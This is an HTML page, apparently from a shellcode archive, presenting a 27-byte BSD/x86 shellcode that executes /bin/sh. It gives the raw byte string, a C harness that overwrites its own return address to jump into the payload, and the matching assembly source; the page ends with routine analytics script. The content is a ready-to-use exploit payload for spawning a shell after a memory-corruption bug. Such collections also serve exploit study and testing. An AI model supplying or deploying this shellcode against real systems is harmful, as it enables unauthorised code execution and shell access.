<html><head><title>BSD/x86 - execve(/bin/sh) - 27 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* execve_sh.c by n0gada	
   27 bytes.
*/
#include &quot;stdio.h&quot;

char shellcode[]=
&quot;\xeb\x0d\x5f\x31\xc0\x50\x89\xe2&quot;
&quot;\x52\x57\x54\xb0\x3b\xcd\x80\xe8&quot;
&quot;\xee\xff\xff\xff/bin/sh&quot;;

int main(void)
{
 int *ret;

	printf(&quot;%d\n&quot;,strlen(shellcode));	
	ret = (int *)&amp;ret+2;
	*ret = (int)shellcode;

return 0;

}

/*********************************************
execve_sh.s

	.globl main
	main:
		jmp strings
	start:
		pop %edi
		xorl %eax,%eax
		push %eax
		movl %esp,%edx
		push %edx
		push %edi
		push %esp
		movb $0x3b,%al
		int $0x80

	strings: call start
		.string &quot;/bin/sh&quot;

*********************************************/


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
